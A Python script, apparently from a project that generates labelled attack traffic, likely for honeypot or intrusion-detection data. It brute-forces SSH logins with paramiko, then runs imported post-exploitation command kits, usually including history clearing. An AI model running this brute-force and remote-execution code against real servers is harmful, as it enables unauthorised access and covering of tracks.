#!/usr/bin/env python3
"""
attacks/mixed.py — Multi-stage attack: brute-force → login → post-exploitation.

Simulates a realistic attack lifecycle where the adversary first brute-forces
credentials, gains access, and then runs malicious commands. The manifest
label for this scenario is "command_attack" because the defining
characteristic is the post-exploitation activity.
"""

import argparse
import random
import sys
import time

import paramiko

from common import (
    COMMON_PASSWORDS,
    COMMON_USERNAMES,
    VALID_CREDENTIALS,
    validate_target,
)

# Reuse command kits from command_attack.py
from command_attack import COMMAND_KITS


def brute_then_exploit(target: str, port: int, seed: int,
                       bf_attempts: int, min_kits: int, max_kits: int,
                       min_cmds_per_kit: int, max_cmds_per_kit: int) -> dict:
    """Brute-force until success, then pivot to post-exploitation."""
    rng = random.Random(seed)

    # Phase 1: Brute-force attempts (all will fail until we inject the valid cred)
    valid_user, valid_pass = rng.choice(VALID_CREDENTIALS)

    # Build a list of bad creds, then inject the good one near the end
    bad_pairs = [
        (rng.choice(COMMON_USERNAMES), rng.choice(COMMON_PASSWORDS))
        for _ in range(bf_attempts)
    ]
    # Insert valid credential in the last 10-30% of attempts
    insert_pos = rng.randint(int(bf_attempts * 0.7), bf_attempts)
    bad_pairs.insert(insert_pos, (valid_user, valid_pass))

    print(f"  [phase1: brute-force] {len(bad_pairs)} attempts, "
          f"valid cred at position ~{insert_pos}")

    successful_client = None
    attempts = 0
    for username, password in bad_pairs:
        attempts += 1
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                hostname=target, port=port,
                username=username, password=password,
                timeout=5, look_for_keys=False, allow_agent=False,
                banner_timeout=10,
            )
            print(f"    [+] SUCCESS at attempt {attempts}: {username}:{password}")
            successful_client = client
            break
        except paramiko.AuthenticationException:
            pass
        except Exception as exc:
            print(f"    [!] Error: {exc}", file=sys.stderr)
        finally:
            if successful_client is None:
                client.close()
        # Delay between brute-force attempts
        time.sleep(rng.uniform(0.05, 0.3))

    if successful_client is None:
        print("  [!] Brute-force phase failed to find valid creds.")
        return {
            "bf_attempts": attempts,
            "phase2": False,
            "commands_run": 0,
        }

    # Phase 2: Post-exploitation (reuse command_attack kits)
    time.sleep(rng.uniform(1.0, 3.0))

    num_kits = rng.randint(min_kits, max_kits)
    kit_names = list(COMMAND_KITS.keys())
    selected = rng.choices(kit_names, k=num_kits)
    rng.shuffle(selected)

    # Usually clear tracks at the end
    if "history_clearing" not in selected and rng.random() < 0.8:
        selected.append("history_clearing")

    print(f"  [phase2: post-exploit] kits={selected}")

    total_cmds = 0
    for kit_name in selected:
        kit_cmds = COMMAND_KITS[kit_name]
        num_cmds = rng.randint(
            min_cmds_per_kit,
            min(max_cmds_per_kit, len(kit_cmds)),
        )
        cmds = rng.sample(kit_cmds, min(num_cmds, len(kit_cmds)))
        print(f"    [{kit_name}] {len(cmds)} commands")

        for cmd in cmds:
            time.sleep(rng.uniform(0.2, 1.5))
            try:
                stdin, stdout, stderr = successful_client.exec_command(cmd)
                stdout.channel.recv_exit_status()
            except Exception:
                pass
            total_cmds += 1

        time.sleep(rng.uniform(0.5, 2.0))

    successful_client.close()
    return {
        "bf_attempts": attempts,
        "phase2": True,
        "kits": selected,
        "commands_run": total_cmds,
    }


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Multi-stage attack: brute-force then post-exploitation")
    parser.add_argument("--target", required=True)
    parser.add_argument("--port",   type=int, default=2222)
    parser.add_argument("--seed",   type=int, required=True)
    parser.add_argument("--bf-attempts",       type=int, default=0,
                        help="Brute-force attempts before success (0 = random 10-50)")
    parser.add_argument("--min-kits",          type=int, default=2)
    parser.add_argument("--max-kits",          type=int, default=4)
    parser.add_argument("--min-cmds-per-kit",  type=int, default=2)
    parser.add_argument("--max-cmds-per-kit",  type=int, default=6)
    args = parser.parse_args()

    validate_target(args.target)

    rng = random.Random(args.seed)
    bf_attempts = args.bf_attempts if args.bf_attempts > 0 else rng.randint(10, 50)

    print(f"[mixed] seed={args.seed}  bf_attempts={bf_attempts}")
    result = brute_then_exploit(
        target=args.target, port=args.port, seed=args.seed,
        bf_attempts=bf_attempts, min_kits=args.min_kits,
        max_kits=args.max_kits, min_cmds_per_kit=args.min_cmds_per_kit,
        max_cmds_per_kit=args.max_cmds_per_kit,
    )
    print(f"[mixed] Done. {result}")


if __name__ == "__main__":
    main()
